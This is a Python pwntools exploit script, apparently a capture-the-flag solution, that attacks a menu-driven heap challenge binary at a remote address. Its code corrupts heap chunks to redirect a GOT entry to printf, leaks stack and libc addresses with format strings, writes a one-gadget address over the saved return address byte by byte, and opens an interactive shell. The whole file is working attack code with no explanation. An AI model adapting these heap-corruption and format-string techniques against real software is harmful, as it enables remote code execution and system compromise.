from pwn import *

#context.log_level = 'debug'

def add(idx, size, pay):
    p.sendafter('>', '1')
    p.sendafter(':', str(idx))
    p.sendafter(':', str(size))
    p.sendafter(':', pay)

def edit(idx, size, pay=None):
    p.sendafter('>', '2')
    p.sendafter(':', str(idx))
    p.sendafter(':', str(size))
    if pay:
        p.sendafter(':', pay)

def delete(idx):
    p.sendafter('>', '3')
    p.sendafter(':', str(idx))    

#p = process('./chall')
p = remote('69.172.229.147', 9003)
e = ELF('./chall')
l = e.libc

add(0, 0x50, 'a')
add(1, 0x50, 'a')
edit(0, 0)
edit(1, 0)
edit(0, 0x70, 'b'*8)
edit(1, 0x70, 'a'*8)
delete(0)
delete(1)
add(0, 0x50, p64(0x602002-8))
add(1, 0x50, 'b'*8)
edit(1, 0x30, 'a')
delete(1)
add(1, 0x50, 'a')
edit(1, 0x20, 'a')
delete(0)

pay = 'a'*6
pay += 'a'*8+p64(e.plt['printf'])[:7]

add(0, 0x50, pay)
edit(1, 0x28, '%8$p %11$p')
delete(1)

p.recvuntil('0x')
stack = int(p.recv(12), 16)
ret = stack + 0x8
print hex(stack)

p.recvuntil('0x')
libc = int(p.recv(12), 16) - 0x20830
magic = libc + 0xf1147
print hex(libc)

add(1, 0x78, '%{}c%13$hn'.format(ret&0xffff))
delete(1)
pay = '%{}c%39$hhn'.format(magic&0xff)
add(1, 0x78, pay)
delete(1)

add(1, 0x78, '%{}c%13$hn'.format((ret&0xffff)+1))
delete(1)
pay = '%{}c%39$hhn'.format((magic&0xff00)>>8)
add(1, 0x78, pay)
delete(1)

add(1, 0x78, '%{}c%13$hn'.format((ret&0xffff)+2))
delete(1)
pay = '%{}c%39$hhn'.format((magic&0xff0000)>>16)
add(1, 0x78, pay)
delete(1)

p.interactive()
